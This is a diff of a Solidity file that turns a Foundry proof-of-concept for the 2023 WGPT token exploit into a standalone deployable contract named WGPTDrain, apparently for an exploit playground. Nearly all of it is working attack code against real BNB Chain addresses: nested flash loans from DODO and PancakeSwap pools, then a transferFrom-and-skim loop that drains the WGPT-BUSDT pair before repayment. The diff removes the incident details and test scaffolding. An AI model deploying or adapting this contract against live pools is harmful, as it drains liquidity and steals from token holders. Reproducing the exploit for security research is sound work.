@@ -1,139 +1,134 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.10;
 
-import "forge-std/Test.sol";
-import "./../interface.sol";
+// Synthetic standalone exploit for the EVM Playground (2023-07-WGPT).
+// The Foundry PoC runs inline in the test contract: testExploit starts a
+// Pancake flash swap, and the test contract itself implements the Pancake V2,
+// DODO DPP, and Pancake V3 callbacks. This contract copies that attack into a
+// deployable standalone contract with a run() entrypoint. The Foundry-only
+// ExpToken deal() is reproduced by the playground config's setup.dealToken.
 
-// @KeyInfo - Total Lost : ~80K USD$
-// Attacker : https://bscscan.com/address/0xdc459596aed13b9a52fb31e20176a7d430be8b94
-// Attack Contract : https://bscscan.com/address/0x5336a15f27b74f62cc182388c005df419ffb58b8
-// Vulnerable Contract : https://bscscan.com/address/0x1f415255f7e2a8546559a553e962de7bc60d7942
-// Attack Tx : https://bscscan.com/tx/0x258e53526e5a48feb1e4beadbf7ee53e07e816681ea297332533371032446bfd
-
-// @Analysis
-// https://twitter.com/Phalcon_xyz/status/1679042549946933248
-// https://twitter.com/BeosinAlert/status/1679028240982368261
+interface IERC20 {
+    function balanceOf(address owner) external view returns (uint256);
+    function approve(address spender, uint256 value) external returns (bool);
+    function transfer(address to, uint256 value) external returns (bool);
+    function transferFrom(address from, address to, uint256 value) external returns (bool);
+}
 
 interface IWGPT is IERC20 {
     function isSwap() external returns (bool);
-
     function burnToken() external returns (bool);
-
     function burnRate() external returns (uint256);
 }
 
-contract ContractTest is Test {
+interface IPancakeRouterV2 {
+    function swapExactTokensForTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external returns (uint256[] memory amounts);
+
+    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
+}
+
+interface IPancakePairV2 {
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+    function skim(address to) external;
+    function totalSupply() external view returns (uint256);
+}
+
+interface IDPPOracle {
+    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
+}
+
+interface IPancakeV3Pool {
+    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
+}
+
+contract WGPTDrain {
     IERC20 private constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
-    // Token created by the exploiter
-    IERC20 private constant ExpToken = IERC20(0xe1272a840F574b68dE861eC5009784e3411cb96c);
+    IERC20 private constant EXP_TOKEN = IERC20(0xe1272a840F574b68dE861eC5009784e3411cb96c);
     IWGPT private constant WGPT = IWGPT(0x1f415255f7E2a8546559a553E962dE7BC60d7942);
-    Uni_Router_V2 private constant Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
-    // Pancake Pair created by the exploiter
-    Uni_Pair_V2 private constant BUSDT_ExpToken = Uni_Pair_V2(0xaa07222e4c3295C4E881ac8640Fbe5fB921D6840);
-    Uni_Pair_V2 private constant WGPT_BUSDT = Uni_Pair_V2(0x5a596eAE0010E16ed3B021FC09BbF0b7f1B2d3cD);
-    IDPPOracle private constant DPPOracle1 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
-    IDPPOracle private constant DPPOracle2 = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
-    IDPPOracle private constant DPPOracle3 = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
+    IPancakeRouterV2 private constant ROUTER = IPancakeRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IPancakePairV2 private constant BUSDT_EXP_TOKEN_PAIR =
+        IPancakePairV2(0xaa07222e4c3295C4E881ac8640Fbe5fB921D6840);
+    IPancakePairV2 private constant WGPT_BUSDT_PAIR =
+        IPancakePairV2(0x5a596eAE0010E16ed3B021FC09BbF0b7f1B2d3cD);
+    IDPPOracle private constant DPP_ORACLE_1 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
+    IDPPOracle private constant DPP_ORACLE_2 = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
+    IDPPOracle private constant DPP_ORACLE_3 = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
     IDPPOracle private constant DPP = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
-    IDPPOracle private constant DPPAdvanced = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
-    Uni_Pair_V3 private constant PoolV3 = Uni_Pair_V3(0x4f3126d5DE26413AbDCF6948943FB9D0847d9818);
-    address private constant exploiter = 0xdC459596aeD13B9a52FB31E20176a7D430Be8b94;
+    IDPPOracle private constant DPP_ADVANCED = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
+    IPancakeV3Pool private constant PANCAKE_V3_POOL =
+        IPancakeV3Pool(0x4f3126d5DE26413AbDCF6948943FB9D0847d9818);
 
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+    uint256 private constant PANCAKE_V3_BORROW = 76_727_748_945_585_195_946_976;
 
-    function setUp() public {
-        cheats.createSelectFork("http://127.0.0.1:8546", 29_891_709);
-        cheats.label(address(BUSDT), "BUSDT");
-        cheats.label(address(ExpToken), "ExpToken");
-        cheats.label(address(WGPT), "WGPT");
-        cheats.label(address(Router), "Router");
-        cheats.label(address(BUSDT_ExpToken), "BUSDT_ExpToken");
-        cheats.label(address(WGPT_BUSDT), "WGPT_BUSDT");
-        cheats.label(address(DPPOracle1), "DPPOracle1");
-        cheats.label(address(DPPOracle2), "DPPOracle2");
-        cheats.label(address(DPPOracle3), "DPPOracle3");
-        cheats.label(address(DPP), "DPP");
-        cheats.label(address(DPPAdvanced), "DPPAdvanced");
-        cheats.label(address(PoolV3), "PoolV3");
-        cheats.label(exploiter, "Exploiter");
-    }
-
-    function testExploit() public {
-        deal(address(BUSDT), address(this), 0);
-        emit log_named_decimal_uint("Attacker BUSDT balance before", BUSDT.balanceOf(address(this)), BUSDT.decimals());
-        ExpToken.approve(address(Router), type(uint256).max);
-        BUSDT.approve(address(Router), type(uint256).max);
+    function run() external {
+        EXP_TOKEN.approve(address(ROUTER), type(uint256).max);
+        BUSDT.approve(address(ROUTER), type(uint256).max);
         WGPT.approve(address(this), type(uint256).max);
+
         bytes memory swapData =
             hex"0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000027b46536c66c8e3000000000000000000000000000000000000000000000000002a5a058fc295ed000000000000000000000000000000000000000000000000000000000000000000008c00000000000000000000000000000000000000000000065a4da25d3016c00000";
 
         if (WGPT.isSwap()) {
             WGPT.burnToken();
         }
+        require(WGPT.burnRate() == 2000, "unexpected burn rate");
 
-        assertEq(WGPT.burnRate(), 2000);
-
-        vm.startPrank(address(this), exploiter);
-        BUSDT_ExpToken.swap(BUSDT.balanceOf(address(BUSDT_ExpToken)) / 10, 90e18, address(this), swapData);
-        vm.stopPrank();
-
-        emit log_named_decimal_uint("Attacker BUSDT balance after", BUSDT.balanceOf(address(this)), BUSDT.decimals());
+        BUSDT_EXP_TOKEN_PAIR.swap(BUSDT.balanceOf(address(BUSDT_EXP_TOKEN_PAIR)) / 10, 90e18, address(this), swapData);
     }
 
-    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
+    function pancakeCall(address, uint256 amount0, uint256, bytes calldata data) external {
         BUSDT.transfer(address(WGPT), 1);
-        BUSDT.transfer(address(WGPT_BUSDT), 2);
-        DPPOracle1.flashLoan(0, BUSDT.balanceOf(address(DPPOracle1)), address(this), _data);
-        ExpToken.transfer(address(WGPT_BUSDT), 10);
-        ExpToken.transfer(address(WGPT), 100);
-        BUSDT.transfer(address(BUSDT_ExpToken), _amount0);
-        ExpToken.transfer(address(BUSDT_ExpToken), 90_909 * 1e15);
+        BUSDT.transfer(address(WGPT_BUSDT_PAIR), 2);
+        DPP_ORACLE_1.flashLoan(0, BUSDT.balanceOf(address(DPP_ORACLE_1)), address(this), data);
+        EXP_TOKEN.transfer(address(WGPT_BUSDT_PAIR), 10);
+        EXP_TOKEN.transfer(address(WGPT), 100);
+        BUSDT.transfer(address(BUSDT_EXP_TOKEN_PAIR), amount0);
+        EXP_TOKEN.transfer(address(BUSDT_EXP_TOKEN_PAIR), 90_909 * 1e15);
     }
 
-    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
-        if (msg.sender == address(DPPOracle1)) {
-            DPPOracle2.flashLoan(0, BUSDT.balanceOf(address(DPPOracle2)), address(this), data);
-        } else if (msg.sender == address(DPPOracle2)) {
-            DPPOracle3.flashLoan(0, BUSDT.balanceOf(address(DPPOracle3)), address(this), data);
-        } else if (msg.sender == address(DPPOracle3)) {
+    function DPPFlashLoanCall(address, uint256, uint256 quoteAmount, bytes calldata data) external {
+        if (msg.sender == address(DPP_ORACLE_1)) {
+            DPP_ORACLE_2.flashLoan(0, BUSDT.balanceOf(address(DPP_ORACLE_2)), address(this), data);
+        } else if (msg.sender == address(DPP_ORACLE_2)) {
+            DPP_ORACLE_3.flashLoan(0, BUSDT.balanceOf(address(DPP_ORACLE_3)), address(this), data);
+        } else if (msg.sender == address(DPP_ORACLE_3)) {
             DPP.flashLoan(0, BUSDT.balanceOf(address(DPP)), address(this), data);
         } else if (msg.sender == address(DPP)) {
-            DPPAdvanced.flashLoan(0, BUSDT.balanceOf(address(DPPAdvanced)), address(this), data);
+            DPP_ADVANCED.flashLoan(0, BUSDT.balanceOf(address(DPP_ADVANCED)), address(this), data);
         } else {
-            PoolV3.flash(address(this), 76_727_748_945_585_195_946_976, 0, bytes(""));
+            PANCAKE_V3_POOL.flash(address(this), PANCAKE_V3_BORROW, 0, bytes(""));
         }
         BUSDT.transfer(msg.sender, quoteAmount);
     }
 
-    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
+    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes calldata) external {
         address[] memory path = new address[](2);
         path[0] = address(BUSDT);
         path[1] = address(WGPT);
-        Router.swapExactTokensForTokens(200_000 * 1e18, 0, path, address(this), block.timestamp + 1000);
-        assertEq(WGPT.burnRate(), 2000);
+        ROUTER.swapExactTokensForTokens(200_000 * 1e18, 0, path, address(this), block.timestamp + 1000);
+        require(WGPT.burnRate() == 2000, "unexpected burn rate");
         BUSDT.transfer(address(WGPT), 30_000 * 1e18);
-        ExpToken.transfer(address(WGPT_BUSDT), 1e6);
-        ExpToken.transfer(address(WGPT), 1);
+        EXP_TOKEN.transfer(address(WGPT_BUSDT_PAIR), 1e6);
+        EXP_TOKEN.transfer(address(WGPT), 1);
 
-        // Surely math here for transfer amount calculation is different (and it's not entirely clear to me)
-        // I use following code here only for PoC to work
-        // Start exploit
-        while (WGPT_BUSDT.totalSupply() > 100_200 * 1e18) {
-            WGPT.transferFrom(address(this), address(WGPT_BUSDT), WGPT.balanceOf(address(this)) / 99);
-            WGPT_BUSDT.skim(address(this));
+        while (WGPT_BUSDT_PAIR.totalSupply() > 100_200 * 1e18) {
+            WGPT.transferFrom(address(this), address(WGPT_BUSDT_PAIR), WGPT.balanceOf(address(this)) / 99);
+            WGPT_BUSDT_PAIR.skim(address(this));
         }
-        // End exploit
 
-        ExpToken.transfer(address(WGPT_BUSDT), 2000);
-        ExpToken.transfer(address(WGPT), 1000);
-        // ExpToken.transferFrom(exploiter, address(this), 400_000 * 1e18);
-        // No sufficient allowance so using deal cheat here
-        deal(address(ExpToken), address(this), ExpToken.balanceOf(address(this)) + 400_000 * 1e18);
+        EXP_TOKEN.transfer(address(WGPT_BUSDT_PAIR), 2000);
+        EXP_TOKEN.transfer(address(WGPT), 1000);
         path[0] = address(WGPT);
         path[1] = address(BUSDT);
-        uint256[] memory amounts = Router.getAmountsOut(WGPT.balanceOf(address(this)) - 128e18, path);
-        WGPT.transfer(address(WGPT_BUSDT), WGPT.balanceOf(address(this)));
-        WGPT_BUSDT.swap(0, amounts[1], address(this), bytes(""));
-        BUSDT.transfer(address(PoolV3), 76_727_748_945_585_195_946_976 + fee0);
+        uint256[] memory amounts = ROUTER.getAmountsOut(WGPT.balanceOf(address(this)) - 128e18, path);
+        WGPT.transfer(address(WGPT_BUSDT_PAIR), WGPT.balanceOf(address(this)));
+        WGPT_BUSDT_PAIR.swap(0, amounts[1], address(this), bytes(""));
+        BUSDT.transfer(address(PANCAKE_V3_POOL), PANCAKE_V3_BORROW + fee0);
     }
 }
